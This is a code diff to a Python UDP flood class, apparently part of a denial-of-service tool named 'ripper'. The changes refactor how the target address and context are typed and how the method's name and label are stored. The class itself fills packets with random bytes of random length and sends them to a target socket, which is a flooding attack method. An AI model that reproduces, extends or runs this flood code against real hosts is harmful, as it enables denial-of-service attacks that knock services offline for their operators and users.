@@ -1,11 +1,16 @@
 from contextlib import suppress
 from socket import socket
-from typing import Tuple, Any
+from typing import Any
 
 from ripper.common import generate_random_bytes
-from ripper.context import Context, Errors
+from ripper.context.errors import Errors
+from ripper.context.target import Target
 from ripper.constants import *
 from ripper.actions.attack_method import AttackMethod
+
+# Forward Reference
+Context = 'Context'
+
 
 # TODO add support for SOCKS5 proxy if proxy supports associate request
 # https://stackoverflow.com/a/47079318/2628125
@@ -14,16 +19,16 @@ from ripper.actions.attack_method import AttackMethod
 # PySocks has issues with basic implementation
 class UdpFlood(AttackMethod):
     """UDP Flood method."""
+
+    name: str = 'UDP Flood'
+    label: str = 'udp-flood'
+
     _sock: socket
-    _target: Tuple[str, int]
+    _target: Target
     _ctx: Context
     _proxy: Any = None
 
-    @property
-    def name(self):
-        return 'UDP Flood'
-
-    def __init__(self, target: Tuple[str, int], context: Context):
+    def __init__(self, target: Target, context: Context):
         self._target = target
         self._ctx = context
 
@@ -47,7 +52,7 @@ class UdpFlood(AttackMethod):
             self._ctx.random_packet_len,
             self._ctx.max_random_packet_len)
         try:
-            sent = sock.sendto(send_bytes, self._target)
+            sent = sock.sendto(send_bytes, self._target.hostip_port_tuple())
         except socket.gaierror as e:
             self._ctx.add_error(Errors('Send UDP packet', GETTING_SERVER_IP_ERROR_MSG))
         except Exception as e:
